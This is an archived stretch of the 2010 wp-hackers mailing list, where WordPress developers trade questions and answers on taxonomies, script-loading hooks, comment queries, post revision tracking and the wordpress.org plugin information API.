Message-ID: <AANLkTimzKAEv6KWXo4snU--7p4G8cabjK39ojJwSAFob@mail.gmail.com>

On Thu, Jul 1, 2010 at 4:33 PM, Thomas Belknap
<dragonfly at dragonflyeye.net>wrote:

> Does it make more sense to move taxonomies to their own top-level menus
> like
> post types are?
>

Not really, since a taxonomy is dependant on an object type (be it a post
type, a link etc.).

In the case of taxonomies defined for multiple post types, see this:

Misleading post count on taxonomy
screen<http://core.trac.wordpress.org/ticket/14076>


-- 
http://scribu.net

From chip at chipbennett.net  Thu Jul  1 17:07:32 2010
From: chip at chipbennett.net (chip at chipbennett.net)
Date: Thu, 1 Jul 2010 11:07:32 -0600
Subject: [wp-hackers] $content_width and hotlinked images
Message-ID: <54012acf1be87d380bf24c3e81e159b6.squirrel@wp06.secure-dns.net>

In reviewing the Theme Development Checklist for WordPress theme
repository-hosted themes, I discovered something odd:

WordPress does not appear to respect/apply $content_width (e.g. as defined
in functions.php) for hotlinked images (i.e. images that are not added via
the Media Library.

The workaround is simple: adding a max-width declaration for images.

However, shouldn't WordPress respect/apply the $content_width setting?

Is this behavior as expected, or should I submit a Trac bug report?

Chip


From dragonfly at dragonflyeye.net  Thu Jul  1 17:22:02 2010
From: dragonfly at dragonflyeye.net (Thomas Belknap)
Date: Thu, 1 Jul 2010 13:22:02 -0400
Subject: [wp-hackers] Taxonomies as Top-Level Menus?
In-Reply-To: <AANLkTik_9OTgJQn4uoWO3d75pq2m-27oqkbRnFwbWxX9@mail.gmail.com>
References: <AANLkTinaMwzxaXrRaPj4qwn_ZlIdeWlS4TJKA2SrSIWs@mail.gmail.com>
	<AANLkTimzKAEv6KWXo4snU--7p4G8cabjK39ojJwSAFob@mail.gmail.com>
	<AANLkTik_9OTgJQn4uoWO3d75pq2m-27oqkbRnFwbWxX9@mail.gmail.com>
Message-ID: <AANLkTimj__Ija1J8fIMiHOstLH49yCOVBXKOZ0FEkd5C@mail.gmail.com>

Yes, but is not dependent upon any one post type. That's why you have to
specify what it work with, correct? And we are still left what happens when
multiple post types have the same taxonomy in terms of organizing the
Control Panel.

On Jul 1, 2010 12:58 PM, "scribu" <scribu at gmail.com> wrote:

On Thu, Jul 1, 2010 at 4:33 PM, Thomas Belknap
<dragonfly at dragonflyeye.net>wrote:


> Does it make more sense to move taxonomies to their own top-level menus
> like
> post types are?
...
Not really, since a taxonomy is dependant on an object type (be it a post
type, a link etc.).

In the case of taxonomies defined for multiple post types, see this:

Misleading post count on taxonomy
screen<http://core.trac.wordpress.org/ticket/14076>


--
http://scribu.net
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From yojoaquin at gmail.com  Thu Jul  1 19:14:28 2010
From: yojoaquin at gmail.com (Joaquin Rodriguez Montero)
Date: Thu, 1 Jul 2010 16:14:28 -0300
Subject: [wp-hackers] Get comments from post-types and from current author
Message-ID: <AANLkTikrIlK179_xn9sjRHVZp35wp6xd5j3cta2WJxfS@mail.gmail.com>

Hi guys!

Quick question if I may. I'm trying to get last 10 comments from a question
post type on one part of the site and I'm trying to get last 10 comments
from that post-type but from posts published by the logged user..

I thought including the following code:

$pre_HTML ="";
$post_HTML ="";
global $wpdb;
$author = get_the_author_ID;
$sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID,
comment_post_ID, comment_author, comment_date_gmt, comment_approved,
comment_type,comment_author_url, SUBSTRING(comment_content,1,30) AS
com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON
($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved =
'1' AND comment_type = '' AND post_password = '' AND author_ID = $author
ORDER BY comment_date_gmt DESC LIMIT 10";

$comments = $wpdb->get_results($sql);
$output = $pre_HTML;
$output .= "\n<ul>";
foreach ($comments as $comment) {
    $output .= "\n<li>".strip_tags($comment->comment_author) .":" . "<a
href=\"" . get_permalink($comment->ID)."#comment-" .    $comment->comment_ID
. "\" title=\"on ".$comment->post_title . "\">" .
strip_tags($comment->com_excerpt)."</a></li>";
}
    $output .= "\n</ul>";
    $output .= $post_HTML;
echo $output;

But I can't retrieve a thing.. any idea?

Chocks

From yojoaquin at gmail.com  Thu Jul  1 19:57:04 2010
From: yojoaquin at gmail.com (Joaquin Rodriguez Montero)
Date: Thu, 1 Jul 2010 16:57:04 -0300
Subject: [wp-hackers] Get comments from post-types and from current
	author
In-Reply-To: <AANLkTikrIlK179_xn9sjRHVZp35wp6xd5j3cta2WJxfS@mail.gmail.com>
References: <AANLkTikrIlK179_xn9sjRHVZp35wp6xd5j3cta2WJxfS@mail.gmail.com>
Message-ID: <AANLkTimypprauAhh440OKvbmsvj9AyUfjhrB7eLy0Tec@mail.gmail.com>

Sorry I've written before trying +10 alternatives. I found the solution:
might be useful for someone:

global $current_user;
        //get_currentuserinfo();
        $author = $current_user->ID;
        $pre_HTML ="";
        $post_HTML ="";
        global $wpdb;
        $sql = "SELECT DISTINCT ID, post_title, post_password, post_type,
comment_ID, comment_post_ID, comment_author, comment_date_gmt,
comment_approved, post_author,comment_type,comment_author_url,
SUBSTRING(comment_content,1,70) AS com_excerpt FROM $wpdb->comments LEFT
OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID =
$wpdb->posts.ID) WHERE comment_approved = '1' AND comment_type = '' AND
post_password = '' AND post_type = 'question' AND post_author = $author
ORDER BY comment_date_gmt DESC LIMIT 10";

        $comments = $wpdb->get_results($sql);
        $output = $pre_HTML;
        $output .= "\n<ul>";
        foreach ($comments as $comment) {
            $output .= "\n<li>".strip_tags($comment->comment_author) .":" .
"<a href=\"" . get_permalink($comment->ID)."#comment-" .
$comment->comment_ID . "\" title=\"on ".$comment->post_title . "\">" .
strip_tags($comment->com_excerpt)."</a></li>";
          }
          $output .= "\n</ul>";
          $output .= $post_HTML;
        echo $output;



On Thu, Jul 1, 2010 at 4:14 PM, Joaquin Rodriguez Montero <
yojoaquin at gmail.com> wrote:

> Hi guys!
>
> Quick question if I may. I'm trying to get last 10 comments from a question
> post type on one part of the site and I'm trying to get last 10 comments
> from that post-type but from posts published by the logged user..
>
> I thought including the following code:
>
> $pre_HTML ="";
> $post_HTML ="";
> global $wpdb;
> $author = get_the_author_ID;
> $sql = "SELECT DISTINCT ID, post_title, post_password, comment_ID,
> comment_post_ID, comment_author, comment_date_gmt, comment_approved,
> comment_type,comment_author_url, SUBSTRING(comment_content,1,30) AS
> com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON
> ($wpdb->comments.comment_post_ID = $wpdb->posts.ID) WHERE comment_approved =
> '1' AND comment_type = '' AND post_password = '' AND author_ID = $author
> ORDER BY comment_date_gmt DESC LIMIT 10";
>
> $comments = $wpdb->get_results($sql);
> $output = $pre_HTML;
> $output .= "\n<ul>";
> foreach ($comments as $comment) {
>     $output .= "\n<li>".strip_tags($comment->comment_author) .":" . "<a
> href=\"" . get_permalink($comment->ID)."#comment-" .    $comment->comment_ID
> . "\" title=\"on ".$comment->post_title . "\">" .
> strip_tags($comment->com_excerpt)."</a></li>";
> }
>     $output .= "\n</ul>";
>     $output .= $post_HTML;
> echo $output;
>
> But I can't retrieve a thing.. any idea?
>
> Chocks
>

From jpenney at jczorkmid.net  Thu Jul  1 21:00:16 2010
From: jpenney at jczorkmid.net (Jason Penney)
Date: Thu, 01 Jul 2010 17:00:16 -0400
Subject: [wp-hackers] wp_default_scripts unreliable?
Message-ID: <4C2D01E0.3070204@jczorkmid.net>

My "Use Google Libraries" plugin uses the wp_default_scripts hook.  Most
of the time, this works fine.  Sometimes it seems like my plugin isn't
even installed.  wp_default_scripts fires in the constructor for
WP_Scripts.  This means that any plugin that calls the
wp_register_script or wp_enqueue_script in its main body of code
(outside of any hooks) will cause wp_default_scripts to fire, which may
be before my plugin code has been loaded.  There seem to be a lot of
these floating around.

I've worked around this by seeing if $wp_scripts has been previously
referenced (is_a($wp_scripts, 'WP_Scripts')) and forcing my action to
execute at that time if it has, but that means that other plugins can't
call remove_action on my hook to disable it in situations where there's
a need to (I know of at least one plugin that does this for mobile
device support).

Is this how wp_default_scripts is intended to work?  Any suggestions on
a better way to handle this?  I guess this would apply to
wp_default_styles as well.

Jay

-- 
Jason C Penney (jpenney at jczorkmid.net)
http://jasonpenney.net/

From hempsworth at gmail.com  Thu Jul  1 21:04:39 2010
From: hempsworth at gmail.com (Alexander Hempton-Smith)
Date: Thu, 1 Jul 2010 22:04:39 +0100
Subject: [wp-hackers] Child themes
Message-ID: <8092107932049849394@unknownmsgid>

I'm cross posting this as I'm unsure as which the most appropriate list is.

What work is being done to add support for child themes in the .org
repo? Obviously there is a bit of tweaking to be done, checking for
updates for the parent theme etc. but it would be great to see this in
3.1- considering the emphasis put on TwentyTen and the ability to use
child themes.

Cheers,
Alex

Sent from my iPhone

From bulk at thecodecave.com  Thu Jul  1 21:09:52 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Thu, 1 Jul 2010 17:09:52 -0400
Subject: [wp-hackers] Child themes
In-Reply-To: <8092107932049849394@unknownmsgid>
References: <8092107932049849394@unknownmsgid>
Message-ID: <009c01cb1961$c18852d0$4498f870$@com>

It's been briefly mentioned by dancole as a possible component of the 3.org
project: http://wordpress.org/support/topic/415075

If this is something you are interested in seeing you should second the idea
over there.

______________________________________________
Brian Layman
eHermits, Inc.
TheCodeCave.com?/?RhettandLink.com?/?twitter.com/BrianLayman /
facebook.com/eHermit


From sergeybiryukov.ru at gmail.com  Thu Jul  1 21:12:00 2010
From: sergeybiryukov.ru at gmail.com (Sergey Biryukov)
Date: Fri, 2 Jul 2010 01:12:00 +0400
Subject: [wp-hackers] wp_default_scripts unreliable?
In-Reply-To: <4C2D01E0.3070204@jczorkmid.net>
References: <4C2D01E0.3070204@jczorkmid.net>
Message-ID: <AANLkTim6-0Gc4G1BCNUgDAK7X11klNSjNmo5km19PGBT@mail.gmail.com>

On Fri, Jul 2, 2010 at 1:00 AM, Jason Penney <jpenney at jczorkmid.net> wrote:
> My "Use Google Libraries" plugin uses the wp_default_scripts hook. ?Most
> of the time, this works fine. ?Sometimes it seems like my plugin isn't
> even installed. ?wp_default_scripts fires in the constructor for
> WP_Scripts. ?This means that any plugin that calls the
> wp_register_script or wp_enqueue_script in its main body of code
> (outside of any hooks) will cause wp_default_scripts to fire, which may
> be before my plugin code has been loaded.

This ticket seems to be related: http://core.trac.wordpress.org/ticket/11526
It was agreed that plugin developers should properly use the enqueue functions.

From mda at blogwaffe.com  Thu Jul  1 21:12:29 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Thu, 1 Jul 2010 14:12:29 -0700
Subject: [wp-hackers] wp_default_scripts unreliable?
In-Reply-To: <4C2D01E0.3070204@jczorkmid.net>
References: <4C2D01E0.3070204@jczorkmid.net>
Message-ID: <AANLkTim-I7VGozZpOVjfEE96dSGQNevtm3en0cjQqjy-@mail.gmail.com>

On Thu, Jul 1, 2010 at 2:00 PM, Jason Penney <jpenney at jczorkmid.net> wrote:
> This means that any plugin that calls the
> wp_register_script or wp_enqueue_script in its main body of code
> (outside of any hooks) will cause wp_default_scripts to fire, which may
> be before my plugin code has been loaded. ?There seem to be a lot of
> these floating around.

Those plugins are probably misbehaving.

That said, can you hook into the script_loader_src filter instead?

--mdawaffe

From wordpress.development at gmail.com  Thu Jul  1 22:23:57 2010
From: wordpress.development at gmail.com (Wordpress Developer)
Date: Thu, 1 Jul 2010 15:23:57 -0700
Subject: [wp-hackers] Tracking changes for posts
Message-ID: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>

I'm developing for a platform that pushes out posts to other systems on
publish. I'd like to be able to inform these systems when there is an update
to the original item, be it a new excerpt, title, or whatever.

In an ideal world I'd be able to do this through something like pubsubhubbub
but the Wordpress plugin is hooked to a publish event vs. the
transition_post_status hook, which is what I'm looking to use.

So right now I'm scoping out creating a DB table that will track posts
changes such that I can create an RSS feed of items those outside systems
should update.

Does anyone have some advice as to the best way to go about tracking changes
for posts? I imagine I look for $post->post_type == "revision" -- but then
what? Is there an elegant way to narrow down to the morsels of info that got
updated?

From wordpress.development at gmail.com  Thu Jul  1 22:26:24 2010
From: wordpress.development at gmail.com (Wordpress Developer)
Date: Thu, 1 Jul 2010 15:26:24 -0700
Subject: [wp-hackers] How to get a plugin URL working on WordPress
In-Reply-To: <AANLkTinxxNU-HYnfnJSXAkY_iazwR8zLUNkDvoQlnBTD@mail.gmail.com>
References: <AANLkTinxxNU-HYnfnJSXAkY_iazwR8zLUNkDvoQlnBTD@mail.gmail.com>
Message-ID: <AANLkTikPZMEAbK7AprxIPX68-C9rs4i9wTex18QFGsab@mail.gmail.com>

I'm not familiar with the problem unfortunately, but I suspect opening
multiple tickets isn't going to get it solved any sooner.

On Wed, Jun 30, 2010 at 8:50 PM, V M <vm at linksalpha.com> wrote:

> URL for our plugin on WordPress is not working for the last 5 days:
> http://wordpress.org/extend/plugins/network-publisher
> It has been working for the last ~1 year. SVN directory is also present:
> http://svn.wp-plugins.org/network-publisher/
>
> Could you pls let me know how to fix the above?
>
> Thanks for your help and time.
> Best Regards,
> VM
> PS: I have opened multiple tickets at http://wordpress.org/report-bugs/almost
> daily but no response.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wp at andrewnacin.com  Thu Jul  1 22:38:01 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Thu, 1 Jul 2010 18:38:01 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 1
In-Reply-To: <AANLkTikMeNbsqC9rDpf27E77yVqsgejHwxV7LhA78SkZ@mail.gmail.com>
References: <mailman.8963.1277966524.1338.wp-hackers@lists.automattic.com> 
	<AANLkTikMeNbsqC9rDpf27E77yVqsgejHwxV7LhA78SkZ@mail.gmail.com>
Message-ID: <AANLkTik7IQIY_qU3JMyo81uel8Ce6UZd4Rj_DNQUiccw@mail.gmail.com>

You have a plugin that is calling register_taxonomy() with rewriting, but
before we actually set up the rewriting module. In 2.9, this silently
failed. In 3.0, it fails with a fatal error.

This belongs in the WordPress.org support forums. You may wish to see this
thread, there is at least one plugin that was doing this incorrectly in 2.9
and there is a patch for it by the author so it works in 3.0:

http://wordpress.org/support/topic/411377

On Thu, Jul 1, 2010 at 12:19 PM, czArte de la Praga <czarte at gmail.com>wrote:

> Hi all, mainly Doncha if is he watching this mailing list.
>
> I just have upgraded my Mu WordPress server on 3.0 automatic actualization
> in admin backend, evertything goes fine, but than shout only this
>
> *Fatal error*: Call to a member function add_rewrite_tag() on a non-object
> in */home/home2/nettree_net/public_html/wp-includes/taxonomy.php* on line *
> 289
>
> *I just uploading backup files, and recovering latest stable instalation,
> but wondering if will be possible upgrade Mu WP soon or never? :)
>
>
> --
> S pozdravem Vojt?ch Park?n
>
> Czarte Design
> www.czarte.eu
>
> Space Orange studio
> www.spaceorange.eu
>
> +420 775 60 35 60
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From scribu at gmail.com  Thu Jul  1 23:30:24 2010
From: scribu at gmail.com (scribu)
Date: Fri, 2 Jul 2010 02:30:24 +0300
Subject: [wp-hackers] Tracking changes for posts
In-Reply-To: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
References: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
Message-ID: <AANLkTimaugmUUhirl7M_xMF6E9V-5WV0214RUZ2xsldD@mail.gmail.com>

On Fri, Jul 2, 2010 at 1:23 AM, Wordpress Developer <
wordpress.development at gmail.com> wrote:

> Does anyone have some advice as to the best way to go about tracking
> changes
> for posts? I imagine I look for $post->post_type == "revision" -- but then
> what? Is there an elegant way to narrow down to the morsels of info that
> got
> updated?
>

WordPress already has a diff utility for seeing the changed content between
revisions. I would look into that.

-- 
http://scribu.net

From cross at thisismyurl.com  Fri Jul  2 14:51:02 2010
From: cross at thisismyurl.com (Christopher Ross)
Date: Fri, 2 Jul 2010 11:51:02 -0300
Subject: [wp-hackers] API for wordpress.org/extend/plugins/?
Message-ID: <B78EB723-56A0-4C6D-A91A-A609575DC802@thisismyurl.com>

Is there a way to query the plugins extended database on wordpress.org? 

I'm looking for a method that would allow me to fetch data such as how many plugins I currently have on the service, the downloads per plugins etc.  Also, to fetch version numbers of each plugin.


Currently I do it using RegEx and Curl, but I'm hoping there's a better way.

c.

__

Christopher Ross

Toronto      1 (416) 840-5828
Fredericton 1 (506) 474-2708

http://christopherross.ca
http://www.thisismyurl.com


From hempsworth at gmail.com  Fri Jul  2 15:07:02 2010
From: hempsworth at gmail.com (Alex Hempton-Smith)
Date: Fri, 2 Jul 2010 16:07:02 +0100
Subject: [wp-hackers] 'Scoring system' to show more relevant posts?
Message-ID: <AANLkTikmkHPB_eAhbbX7ChHHl1P_tRwOnf1lD1iqCh-j@mail.gmail.com>

Hi all,

Putting this out there to see whether others have worked on something
similar, and any tips you might have.

I'm working on a news website, online newspaper type thing, that I'd like to
make more relevant for users. The homepage will be just like a newspaper
frontpage, but dynamically generated based on what is popular and relevant
to the user (if logged in).

I thought I could basically work out a scoring system, that gives each post
a 'score' based on different criteria:

Popularity (how many views and/or stars)
Timestamp (latest posts have a higher score)
Interests (I'll have an array of the users interests and if the posts
tags/cats match one or more, it gets a higher score)
Location (the logged in user will provide a postcode, if the post is in
their region it gets bumped)

etc etc.

My only issue is making this happen on the homepage, do I just 'foreach'
through the latest posts and then generate the homepage based on that? Thats
resource intensive though...

What are your thoughts on making homepages more relevant to users? If I can
package this up, I'll release it as a plugin later on.

-- Alex  (Hempsworth)

From m at mullenweg.com  Fri Jul  2 15:30:28 2010
From: m at mullenweg.com (Matt Mullenweg)
Date: Fri, 02 Jul 2010 11:30:28 -0400
Subject: [wp-hackers] Tracking changes for posts
In-Reply-To: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
References: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
Message-ID: <4C2E0614.3060905@mullenweg.com>

Could you please change your name and email, and if you're going to use 
something so confusing at least capitalize the P correctly.

On 7/1/2010 6:23 PM, Wordpress Developer wrote:
> I'm developing for a platform that pushes out posts to other systems on
> publish. I'd like to be able to inform these systems when there is an update
> to the original item, be it a new excerpt, title, or whatever.
>
> In an ideal world I'd be able to do this through something like pubsubhubbub
> but the Wordpress plugin is hooked to a publish event vs. the
> transition_post_status hook, which is what I'm looking to use.
>
> So right now I'm scoping out creating a DB table that will track posts
> changes such that I can create an RSS feed of items those outside systems
> should update.
>
> Does anyone have some advice as to the best way to go about tracking changes
> for posts? I imagine I look for $post->post_type == "revision" -- but then
> what? Is there an elegant way to narrow down to the morsels of info that got
> updated?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
Matt Mullenweg
http://ma.tt | http://wordpress.org | http://automattic.com

From jpenney at jczorkmid.net  Thu Jul  1 22:01:42 2010
From: jpenney at jczorkmid.net (Jason Penney)
Date: Thu, 01 Jul 2010 18:01:42 -0400
Subject: [wp-hackers] wp_default_scripts unreliable?
In-Reply-To: <AANLkTim-I7VGozZpOVjfEE96dSGQNevtm3en0cjQqjy-@mail.gmail.com>
References: <4C2D01E0.3070204@jczorkmid.net>
	<AANLkTim-I7VGozZpOVjfEE96dSGQNevtm3en0cjQqjy-@mail.gmail.com>
Message-ID: <4C2D1046.9080907@jczorkmid.net>

On 7/1/10 5:12 PM, Sergey Biryukov wrote:
> This ticket seems to be related: http://core.trac.wordpress.org/ticket/11526
> It was agreed that plugin developers should properly use the enqueue functions.

On 7/1/10 5:12 PM, Michael D Adams wrote:
> Those plugins are probably misbehaving.

That was my take on it as well, but I don't think it's obvious that
calling wp_enqueue_script before 'init' is problematic (there's a
mention of it in the Codex, but I didn't see it there until I searched
the page for 'init').  It doesn't seem to be mentioned in many of the
examples out in the wild.


> That said, can you hook into the script_loader_src filter instead?

I probably *could*, but I specifically chose wp_default_scripts to
ensure my plugin had minimal unintended consequences.  I wanted to be
sure to step out of the way of anything doing wp_deregister_script/
wp_register_script to override any of the default scripts.


Thanks,
Jay




-- 
Jason C Penney (jpenney at jczorkmid.net)
http://jasonpenney.net/

From jimmy.roy at gmail.com  Fri Jul  2 16:30:43 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Sat, 3 Jul 2010 00:30:43 +0800
Subject: [wp-hackers] Custom post types filtering
In-Reply-To: <AANLkTinsMTHrg738haKKd0QnhwcMmJ9Hk3y_Gww4TKfz@mail.gmail.com>
References: <b77132d2-2bf0-40d1-8c61-82201193f1a6@x27g2000yqb.googlegroups.com>
	<01336308-4de2-40b7-bbc5-2afb0ddb6739@i31g2000yqm.googlegroups.com>
	<AANLkTinsMTHrg738haKKd0QnhwcMmJ9Hk3y_Gww4TKfz@mail.gmail.com>
Message-ID: <AANLkTil_gqS2ql56yG0DjaxTV3OTO2tUWQL14jUyRpB2@mail.gmail.com>

hi all,
I just start to play with custom post type and custom taxonomies.
I follow the excellent tutorial by Justin Tadlock everything works fine, now
I want to display the list of taxonomies associate to my new custom post
type (something like wp_list_categories()).

for example I create a new custom post type called Movie and a taxonomy
called Actor.

I want to display in the sidebar :
*Actors*

   - Brad Pitt
   - Georges Clooney
   - ...

any idea to do that?

thank u for your help.

Jimmy

From jimmy.roy at gmail.com  Fri Jul  2 16:32:19 2010
From: jimmy.roy at gmail.com (Jimmy Roy)
Date: Sat, 3 Jul 2010 00:32:19 +0800
Subject: [wp-hackers] display the list of new taxonomy
Message-ID: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>

sorry for double post, I forgot to change the message object.

hi all,
I just start to play with custom post type and custom taxonomies.
I follow the excellent tutorial by Justin Tadlock everything works fine, now
I want to display the list of taxonomies associate to my new custom post
type (something like wp_list_categories()).

for example I create a new custom post type called Movie and a taxonomy
called Actor.

I want to display in the sidebar :
*Actors*

   - Brad Pitt
   - Georges Clooney
   - ...

any idea to do that?

thank u for your help.

Jimmy

From wordpress.development at gmail.com  Fri Jul  2 16:43:18 2010
From: wordpress.development at gmail.com (Wordpress Developer)
Date: Fri, 2 Jul 2010 09:43:18 -0700
Subject: [wp-hackers] Tracking changes for posts
In-Reply-To: <4C2E0614.3060905@mullenweg.com>
References: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
	<4C2E0614.3060905@mullenweg.com>
Message-ID: <AANLkTil8doSIxvav1zALYaWD7NjKhdNGEGs6Saxi1a0x@mail.gmail.com>

I'll remove myself from the list. Thanks for the kind welcome, Matt.

On Fri, Jul 2, 2010 at 8:30 AM, Matt Mullenweg <m at mullenweg.com> wrote:

> Could you please change your name and email, and if you're going to use
> something so confusing at least capitalize the P correctly.
>
>
> On 7/1/2010 6:23 PM, Wordpress Developer wrote:
>
>> I'm developing for a platform that pushes out posts to other systems on
>> publish. I'd like to be able to inform these systems when there is an
>> update
>> to the original item, be it a new excerpt, title, or whatever.
>>
>> In an ideal world I'd be able to do this through something like
>> pubsubhubbub
>> but the Wordpress plugin is hooked to a publish event vs. the
>> transition_post_status hook, which is what I'm looking to use.
>>
>> So right now I'm scoping out creating a DB table that will track posts
>> changes such that I can create an RSS feed of items those outside systems
>> should update.
>>
>> Does anyone have some advice as to the best way to go about tracking
>> changes
>> for posts? I imagine I look for $post->post_type == "revision" -- but then
>> what? Is there an elegant way to narrow down to the morsels of info that
>> got
>> updated?
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>>
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From banago at gmail.com  Fri Jul  2 16:45:34 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Fri, 2 Jul 2010 18:45:34 +0200
Subject: [wp-hackers] Tracking changes for posts
In-Reply-To: <AANLkTil8doSIxvav1zALYaWD7NjKhdNGEGs6Saxi1a0x@mail.gmail.com>
References: <AANLkTimcobfyZTRJfpr2l44LrcPDLgJRVpdg5AowVBa3@mail.gmail.com>
	<4C2E0614.3060905@mullenweg.com>
	<AANLkTil8doSIxvav1zALYaWD7NjKhdNGEGs6Saxi1a0x@mail.gmail.com>
Message-ID: <AANLkTin_ERgdWuxN2-CoYRoVDAHxClpOoXnJWKr2ZGpS@mail.gmail.com>

>
> I'll remove myself from the list. Thanks for the kind welcome, Matt.
>

We'll be missing you.

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 2 July 2010 18:43, Wordpress Developer
<wordpress.development at gmail.com>wrote:

> I'll remove myself from the list. Thanks for the kind welcome, Matt.
>
> On Fri, Jul 2, 2010 at 8:30 AM, Matt Mullenweg <m at mullenweg.com> wrote:
>
> > Could you please change your name and email, and if you're going to use
> > something so confusing at least capitalize the P correctly.
> >
> >
> > On 7/1/2010 6:23 PM, Wordpress Developer wrote:
> >
> >> I'm developing for a platform that pushes out posts to other systems on
> >> publish. I'd like to be able to inform these systems when there is an
> >> update
> >> to the original item, be it a new excerpt, title, or whatever.
> >>
> >> In an ideal world I'd be able to do this through something like
> >> pubsubhubbub
> >> but the Wordpress plugin is hooked to a publish event vs. the
> >> transition_post_status hook, which is what I'm looking to use.
> >>
> >> So right now I'm scoping out creating a DB table that will track posts
> >> changes such that I can create an RSS feed of items those outside
> systems
> >> should update.
> >>
> >> Does anyone have some advice as to the best way to go about tracking
> >> changes
> >> for posts? I imagine I look for $post->post_type == "revision" -- but
> then
> >> what? Is there an elegant way to narrow down to the morsels of info that
> >> got
> >> updated?
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >>
> >
> > --
> > Matt Mullenweg
> > http://ma.tt | http://wordpress.org | http://automattic.com
> >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From logikal16 at gmail.com  Fri Jul  2 17:50:25 2010
From: logikal16 at gmail.com (Matt)
Date: Fri, 2 Jul 2010 13:50:25 -0400
Subject: [wp-hackers] API for wordpress.org/extend/plugins/?
In-Reply-To: <B78EB723-56A0-4C6D-A91A-A609575DC802@thisismyurl.com>
References: <B78EB723-56A0-4C6D-A91A-A609575DC802@thisismyurl.com>
Message-ID: <AANLkTin3svQkqyTM66RQU2ow7d04qpHwi-BIzRt1WKkk@mail.gmail.com>

Yes, there is a plugin API.

It's pretty poorly documented, and it seems to have reliability issues (the
API would occasionally crash if trying to retrieve data on a couple hundred
plugins at once).

Here's my function to retrieve a listing of plugins:
http://wordpress.pastebin.com/7Ji8rD2P

Here's the documentation I did find (thanks DD32):
http://dd32.id.au/projects/wordpressorg-plugin-information-api-docs/

<http://wordpress.pastebin.com/7Ji8rD2P>Hope that helps,
Matt

On Fri, Jul 2, 2010 at 10:51 AM, Christopher Ross <cross at thisismyurl.com>wrote:

> Is there a way to query the plugins extended database on wordpress.org?
>
> I'm looking for a method that would allow me to fetch data such as how many
> plugins I currently have on the service, the downloads per plugins etc.
>  Also, to fetch version numbers of each plugin.
>
>
> Currently I do it using RegEx and Curl, but I'm hoping there's a better
> way.
>
> c.
>
> __
>
> Christopher Ross
>
> Toronto      1 (416) 840-5828
> Fredericton 1 (506) 474-2708
>
> http://christopherross.ca
> http://www.thisismyurl.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mda at blogwaffe.com  Fri Jul  2 18:00:47 2010
From: mda at blogwaffe.com (Michael D Adams)
Date: Fri, 2 Jul 2010 11:00:47 -0700
Subject: [wp-hackers] API for wordpress.org/extend/plugins/?
In-Reply-To: <B78EB723-56A0-4C6D-A91A-A609575DC802@thisismyurl.com>
References: <B78EB723-56A0-4C6D-A91A-A609575DC802@thisismyurl.com>
Message-ID: <AANLkTind-R3XQl7hhtmKhTRYO0tOIyVLyKzKLG08t0f2@mail.gmail.com>

On Fri, Jul 2, 2010 at 7:51 AM, Christopher Ross <cross at thisismyurl.com> wrote:
> Is there a way to query the plugins extended database on wordpress.org?
>
> I'm looking for a method that would allow me to fetch data such as how many plugins I currently have on the service, the downloads per plugins etc. ?Also, to fetch version numbers of each plugin.
>
>
> Currently I do it using RegEx and Curl, but I'm hoping there's a better way.

Here's some more undocumented API:

http://api.wordpress.org/plugins/info/1.0/hello-dolly.php
http://api.wordpress.org/plugins/info/1.0/hello-dolly.xml
http://api.wordpress.org/plugins/info/1.0/hello-dolly.json
http://api.wordpress.org/plugins/info/1.0/hello-dolly.jsonp=callback

I thought there was an RSS feed for plugins a person had authored, but
I'm wrong, so no help there.

From mikeschinkel at newclarity.net  Fri Jul  2 18:13:11 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 14:13:11 -0400
Subject: [wp-hackers] display the list of new taxonomy
In-Reply-To: <AANLkTikp71c-bwZ9GEd6AQrAr7gYrRTlgA3u4nD1xg33@mail.gmail.com>
